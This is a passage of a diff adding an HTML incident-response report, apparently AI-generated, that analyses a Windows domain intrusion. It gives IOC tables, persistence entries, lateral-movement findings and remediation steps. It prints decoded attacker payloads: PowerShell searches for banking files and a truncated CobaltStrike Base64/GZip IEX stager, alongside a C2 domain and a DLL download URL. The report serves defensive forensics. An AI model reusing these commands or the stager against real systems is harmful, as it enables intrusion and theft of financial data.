+<td>http://secure.n-document.com:443/crx</td>
+<td>Outbound</td>
+<td>ACC-03</td>
+<td>DLL payload download URL</td>
+</tr>
+<tr>
+<td>Port</td>
+<td>443 (HTTP, not HTTPS)</td>
+<td>Outbound</td>
+<td>ACC-03, ACC-09</td>
+<td>C2 communication using HTTP over port 443 to evade firewall rules</td>
+</tr>
+</tbody></table>
+<h3 id="6-3-persistence-mechanisms">6-3. Persistence Mechanisms</h3>
+<table>
+<thead><tr>
+<th>Type</th>
+<th>Name/Path</th>
+<th>Host</th>
+<th>Context</th>
+</tr></thead><tbody>
+<tr>
+<td>Windows Service</td>
+<td>b8b8705 (demand start, LocalSystem)</td>
+<td>IT-02</td>
+<td>CobaltStrike beacon - encoded PowerShell GZip stager</td>
+</tr>
+<tr>
+<td>Scheduled Task</td>
+<td>AA (ONLOGON, user Gail.Goff)</td>
+<td>IT-02</td>
+<td>Executes mshta with AA_V3.hta on user logon</td>
+</tr>
+<tr>
+<td>Group Policy</td>
+<td>DisableRealtimeMonitoring=1</td>
+<td>ALL hosts</td>
+<td>Defender real-time protection disabled domain-wide</td>
+</tr>
+<tr>
+<td>Group Policy</td>
+<td>restrictsendingntlmtraffic=1</td>
+<td>ALL hosts</td>
+<td>NTLM authentication downgrade domain-wide</td>
+</tr>
+</tbody></table>
+<h3 id="6-4-account-iocs">6-4. Account IOCs</h3>
+<table>
+<thead><tr>
+<th>Account</th>
+<th>Type</th>
+<th>Suspicious Activity</th>
+<th>Host</th>
+</tr></thead><tbody>
+<tr>
+<td>Chad.Chan</td>
+<td>Domain User</td>
+<td>Malware execution, financial file search, RDP tunnel</td>
+<td>ACC-01</td>
+</tr>
+<tr>
+<td>Albert.Willoughby</td>
+<td>Domain User</td>
+<td>Malware execution, C2 communication, tool download, financial data search</td>
+<td>ACC-03, ACC-09</td>
+</tr>
+<tr>
+<td>Anna.Ward</td>
+<td>Domain User</td>
+<td>Malware execution, software enumeration</td>
+<td>ACC-04</td>
+</tr>
+<tr>
+<td>Jean.Owen</td>
+<td>Domain User</td>
+<td>Malware execution, software enumeration</td>
+<td>ACC-05</td>
+</tr>
+</tbody></table>
+<h2 id="7-decoded-payloads">7. Decoded Payloads</h2>
+<h3 id="payload-1-empire-powershell---banking-file-search">Payload 1: Empire PowerShell - Banking File Search</h3>
+<ul>
+<li><strong>Detection Time</strong>: 2022-08-09 05:25:23 UTC</li>
+<li><strong>Detection Host</strong>: ACC-01.corp.net</li>
+<li><strong>Detection Rule</strong>: HackTool - Empire PowerShell Launch Parameters</li>
+<li><strong>Encoding Method</strong>: Base64 (UTF-16LE)</li>
+<li><strong>Decoded Result</strong>:</li>
+</ul>
+<pre><code>  gci -Path C:\Users -Recurse -Include *bank*</code></pre>
+<ul>
+<li><strong>Analysis</strong>: Searches all user directories for files containing &quot;bank&quot; in the filename. Indicates targeted financial data discovery.</li>
+<li><strong>Maliciousness Assessment</strong>: Attack payload - financial data exfiltration reconnaissance</li>
+</ul>
+<h3 id="payload-2-empire-powershell---software-inventory">Payload 2: Empire PowerShell - Software Inventory</h3>
+<ul>
+<li><strong>Detection Time</strong>: 2022-08-09 05:46:12 UTC</li>
+<li><strong>Detection Host</strong>: ACC-04.corp.net</li>
+<li><strong>Detection Rule</strong>: HackTool - Empire PowerShell Launch Parameters</li>
+<li><strong>Encoding Method</strong>: Base64 (UTF-16LE)</li>
+<li><strong>Decoded Result</strong>:</li>
+</ul>
+<pre><code>  Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall* | Select-Object DisplayName, DisplayVersion, Publisher, Size, InstallDate</code></pre>
+<ul>
+<li><strong>Analysis</strong>: Enumerates installed 32-bit software on the target. Used for discovery to identify security tools and potential attack surface.</li>
+<li><strong>Maliciousness Assessment</strong>: Attack payload - discovery/reconnaissance</li>
+</ul>
+<h3 id="payload-3-empire-powershell---expanded-financial-search">Payload 3: Empire PowerShell - Expanded Financial Search</h3>
+<ul>
+<li><strong>Detection Time</strong>: 2022-08-09 06:23:21 UTC</li>
+<li><strong>Detection Host</strong>: ACC-03.corp.net</li>
+<li><strong>Detection Rule</strong>: HackTool - Empire PowerShell Launch Parameters</li>
+<li><strong>Encoding Method</strong>: Base64 (UTF-16LE)</li>
+<li><strong>Decoded Result</strong>:</li>
+</ul>
+<pre><code>  gci C:\Users -recurse -include *bank*,*atm*,*accounts*</code></pre>
+<ul>
+<li><strong>Analysis</strong>: Expanded search including ATM and accounts-related files. Indicates escalated data collection targeting financial systems.</li>
+<li><strong>Maliciousness Assessment</strong>: Attack payload - financial data exfiltration reconnaissance</li>
+</ul>
+<h3 id="payload-4-cobaltstrike-service-stager">Payload 4: CobaltStrike Service Stager</h3>
+<ul>
+<li><strong>Detection Time</strong>: 2022-08-09 04:55:44 UTC</li>
+<li><strong>Detection Host</strong>: IT-02.corp.net</li>
+<li><strong>Detection Rule</strong>: CobaltStrike Service Installations - System</li>
+<li><strong>Encoding Method</strong>: Base64 + GZip compression</li>
+<li><strong>Decoded Result</strong>:</li>
+</ul>
+<pre><code>  $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&quot;H4sIAAAAAAAA...&quot;));
+  IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</code></pre>
+<ul>
+<li><strong>Analysis</strong>: Classic CobaltStrike PowerShell stager - decompresses GZip-encoded shellcode from Base64 string and executes via IEX. The decompressed payload likely contains a Beacon implant connecting to the attacker&#x27;s C2.</li>
+<li><strong>Maliciousness Assessment</strong>: Attack payload - CobaltStrike beacon deployment</li>
+</ul>
+<h2 id="8-lateral-movement-analysis">8. Lateral Movement Analysis</h2>
+<h3 id="propagation-path">Propagation Path</h3>
+<pre><code>IT-03 (04:52) --[Mimikatz cred theft]--&gt; Domain Credentials Obtained
+                                              |
+ IT-02 (04:55) &lt;--[CobaltStrike service]------+
+                                              |
+ ACC-01 (05:19) &lt;--[Phishing]--+              |
+ ACC-04 (05:19) &lt;--[Phishing]--+              |
+ ACC-09 (05:20) &lt;--[Phishing]--+--------------+
+ ACC-05 (05:21) &lt;--[Phishing]--+
+                    |
+ ACC-09 (06:06) --[msxsl.exe C2]--&gt; secure.n-document.com
+ ACC-03 (06:09) --[msxsl.exe C2]--&gt; secure.n-document.com
+ ACC-03 (06:21) --[crx.dll download]--&gt; secure.n-document.com
+                    |
+ ALL hosts (12:00) &lt;--[GPO: Disable Defender + NTLM Downgrade]-- Domain Controller</code></pre>
+<h3 id="lateral-movement-event-details">Lateral Movement Event Details</h3>
+<p>Direct host-to-host lateral movement via SMB/RDP/WinRM was not explicitly detected between individual hosts. However, the attack progression indicates:</p>
+<ol>
+<li><strong>IT-03 → Domain</strong>: Mimikatz credential harvesting provided domain credentials</li>
+<li><strong>Domain → IT-02</strong>: CobaltStrike beacon installed as a service (requires admin access, likely using stolen credentials)</li>
+<li><strong>Phishing → ACC workstations</strong>: Four users opened the same malicious attachment nearly simultaneously, suggesting a bulk email campaign</li>
+<li><strong>ACC-01</strong>: RDP tunnel (localhost:127.0.0.1) established for persistent graphical access</li>
+<li><strong>ACC-09/ACC-03 → C2</strong>: Active C2 communication via msxsl.exe to secure.n-document.com</li>
+<li><strong>Domain Controller → ALL</strong>: GPO deployment indicates domain admin compromise</li>
+</ol>
+<p>The absence of traditional lateral movement (PsExec, WMI, WinRM) between hosts suggests the attacker relied on phishing for workstation access and credential abuse for server access.</p>
+<h2 id="9-investigation-notes-and-recommendations">9. Investigation Notes and Recommendations</h2>
+<h3 id="analysis-constraints">Analysis Constraints</h3>
+<ul>
+<li><strong>Scope</strong>: This report is based on events detected by Hayabusa Sigma rules. Activity not matching any rule is outside detection scope</li>
+<li><strong>Timestamps</strong>: All in UTC</li>
+<li><strong>Log Sources</strong>: Windows Event Logs (Security, Sysmon, System, PowerShell) from 9 domain-joined hosts. Domain Controller logs appear absent from the dataset, limiting visibility into AD-level operations (GPO modifications, Kerberos attacks, DC logon events)</li>
+<li><strong>Aug 5 Activity</strong>: Significant Packer/IT automation activity on 2022-08-05 was investigated and determined to be legitimate infrastructure provisioning (see False Positives below). Only Aug 9 events constitute the actual attack</li>
+</ul>
+<h3 id="events-determined-to-be-false-positives">Events Determined to be False Positives</h3>
+<table>
+<thead><tr>
+<th>Rule Title</th>
+<th>Count</th>
+<th>Determination Rationale (Details Summary)</th>
+</tr></thead><tbody>
+<tr>
+<td>Suspicious Service Path (ASP.NET)</td>
+<td>9</td>
+<td>Legitimate ASP.NET State Service: <code>%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe</code> - standard Windows .NET service</td>
+</tr>
+<tr>
+<td>Suspicious Service Path (LimaCharlie)</td>
+<td>10</td>
+<td>Legitimate LimaCharlie EDR agent: <code>C:\Windows\System32\rphcp.exe</code> - security monitoring tool deployed across all hosts</td>
+</tr>
+<tr>
+<td>HackTool - Koadic Execution</td>
+<td>95</td>
+<td>Packer IT automation pattern: <code>chcp 437 &gt; /dev/null &amp; Powershell -NonInteractive -NoProfile</code> installing Microsoft EasyFix51044.msi, .NET Framework 4.71, and Windows KB3140245. All under SYSTEM/machine accounts on Aug 5</td>
+</tr>
+<tr>
+<td>Suspicious Script Execution From Temp Folder</td>
+<td>136</td>
+<td>Same Packer automation: installing MS updates from C:\Windows\Temp under machine accounts</td>
+</tr>
+<tr>
+<td>Suspicious Encoded PowerShell Command Line (Packer)</td>
+<td>~120</td>
+<td>Packer WinRM file copy: <code>winrmcp-<em>.tmp</code> → <code>packer-ps-env-vars-</em>.ps1</code> / <code>packer-elevated-shell-*.ps1</code>. User: helpdesk</td>
+</tr>
+<tr>
+<td>Suspicious Epmap Connection</td>
+<td>23</td>
+<td>Outlook.exe connecting to EXCHANGE server (172.29.42.16) on port 135 - normal Outlook/Exchange RPC communication</td>
+</tr>
+<tr>
+<td>Suspicious Microsoft Office Child Process</td>
+<td>1</td>
+<td>PowerPoint spawning rundll32.exe calling <code>WININET.DLL,DispatchAPICall</code> - legitimate WinInet API call for internet connectivity</td>
+</tr>
+<tr>
+<td>New Lolbin Process by Office Applications</td>
+<td>1</td>
+<td>Same event as above - PowerPoint internet connectivity</td>
+</tr>
+</tbody></table>
+<h3 id="indeterminate-events">Indeterminate Events</h3>
+<table>
+<thead><tr>
+<th>Event</th>
+<th>Assessment</th>
+</tr></thead><tbody>
+<tr>
+<td>User Added To Local Admin Grp (45 events, Aug 5)</td>
+<td>SIDs added to Administrators group across all hosts during Packer provisioning window. Likely Packer configuration but could represent attacker privilege escalation. Domain SID S-1-5-21-1071627472...-513 (Domain Users) added to local Admins on IT hosts is concerning</td>
+</tr>
+<tr>
+<td>Uninstall Sysinternals Sysmon (6 events, Aug 5 12:41)</td>
+<td>Sysmon uninstalled simultaneously on 6 hosts under SYSTEM. Timing coincides with Packer window but Sysmon removal is also a common defense evasion technique. Requires correlation with IT change management records</td>
+</tr>
+<tr>
+<td>NetNTLM Downgrade Attack (148 events, Aug 9 12:00+)</td>
+<td>Deployed via services.exe (Group Policy). Could be legitimate IT policy or attacker-deployed GPO. Given the active attack context, assessed as likely malicious</td>
+</tr>
+<tr>
+<td>Disable Windows Defender (148 events, Aug 9 12:00+)</td>
+<td>Same assessment as NetNTLM Downgrade - deployed via GPO during active attack, likely attacker action</td>
+</tr>
+</tbody></table>
+<h3 id="recommended-additional-investigation">Recommended Additional Investigation</h3>
+<ol>
+<li><strong>Domain Controller logs</strong>: Collect and analyze DC event logs to identify GPO modifications, Kerberos ticket operations, and admin account usage</li>
+<li><strong>Email gateway logs</strong>: Correlate the Security_Protocol.doc.exe phishing email - identify sender, additional recipients, and delivery timestamps</li>
+<li><strong>Network traffic analysis</strong>: Examine firewall/proxy logs for all connections to secure.n-document.com (duration, volume, additional endpoints)</li>
+<li><strong>Memory forensics</strong>: Capture memory from IT-02 (CobaltStrike beacon) and IT-03 (Mimikatz) to extract full beacon configuration and harvested credentials</li>
+<li><strong>crx.dll analysis</strong>: Retrieve and analyze the downloaded DLL from ACC-03 (C:\Temp\crx.dll) for capabilities and additional IOCs</li>
+<li><strong>AA_V3.hta analysis</strong>: Analyze the HTA persistence payload from IT-02 (C:\Users\Gail.Goff\Documents\AA_V3.hta)</li>
+<li><strong>Timeline gap (07:00-12:00 UTC)</strong>: Investigate what the attacker did during the 5-hour gap before GPO deployment - likely privilege escalation to Domain Admin occurred during this period</li>
+<li><strong>Financial data impact</strong>: Determine whether banking/accounting files were actually exfiltrated based on the targeted file searches</li>
+</ol>
+<h3 id="containment-and-recovery-recommendations">Containment and Recovery Recommendations</h3>
+<ol>
+<li><strong>Immediate</strong>: Isolate all 9 affected hosts from the network. Disable compromised accounts (Chad.Chan, Anna.Ward, Albert.Willoughby, Jean.Owen, Gail.Goff, Julia.Jones)</li>
+<li><strong>Credential Reset</strong>: Reset passwords for ALL domain accounts, particularly Domain Admins. Revoke and reissue Kerberos tickets (krbtgt double reset)</li>
+<li><strong>C2 Blocking</strong>: Block secure.n-document.com at DNS/firewall/proxy level. Block all IOC file hashes</li>
+<li><strong>Service Removal</strong>: Remove CobaltStrike service (b8b8705) from IT-02. Remove scheduled task &quot;AA&quot; from IT-02. Delete ftg.exe from IT-03, msxsl.exe and crx.dll from ACC-03/ACC-09</li>
+<li><strong>GPO Remediation</strong>: Revert malicious GPO changes - re-enable Defender real-time monitoring and restore NTLM settings</li>
+<li><strong>Sysmon Restoration</strong>: Reinstall Sysmon across all hosts for continued monitoring</li>
+<li><strong>Enhanced Monitoring</strong>: Deploy EDR with behavioral detection. Monitor for re-compromise attempts using same TTPs</li>
+</ol>
+<hr>
+<blockquote><strong>Report Metadata</strong><br>
+- Generated by: Claude Code 2.1.74<br>
+- Model: claude-opus-4-6<br>
+- Analysis duration: 9:07<br>
+- Report generated at: 2026-03-13 16:22:53 (Local)</blockquote>
+</main>
+
+<script>
+// highlight active nav on scroll
+(function(){
+  var links = document.querySelectorAll('#sidebar a[href^="#"]');
+  var sections = [];
+  links.forEach(function(a){
+    var id = a.getAttribute('href').slice(1);
+    var el = document.getElementById(id);
+    if(el) sections.push({el:el, a:a});
+  });
+  function onScroll(){
+    var scrollY = window.scrollY + 120;
+    var current = sections[0];
+    for(var i=0;i<sections.length;i++){
+      if(sections[i].el.offsetTop <= scrollY) current = sections[i];
+    }
+    links.forEach(function(a){ a.classList.remove('active'); });
+    if(current) current.a.classList.add('active');
+  }
+  window.addEventListener('scroll', onScroll);
+  onScroll();
+})();
+</script>
+</body>
+</html>
